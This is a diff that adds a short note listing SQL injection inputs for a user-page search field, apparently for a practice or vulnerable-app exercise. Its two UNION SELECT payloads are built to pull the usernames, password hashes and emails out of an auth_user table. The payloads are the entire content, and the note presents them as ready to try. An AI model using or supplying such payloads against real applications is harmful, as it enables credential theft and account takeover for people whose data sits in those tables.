@@ -1,0 +1,7 @@
+Here are some inputs for the search query field on user page to try out exfiltration by injection
+
+This one displays the usernames found on auth_user:
+a%' UNION SELECT id, username, password, email FROM auth_user  WHERE 1 = 1 OR id LIKE '%1
+
+This one displays the password hashes found on auth_user:
+a%' UNION SELECT id, password, email, username FROM auth_user  WHERE 1 = 1 OR id LIKE '%1
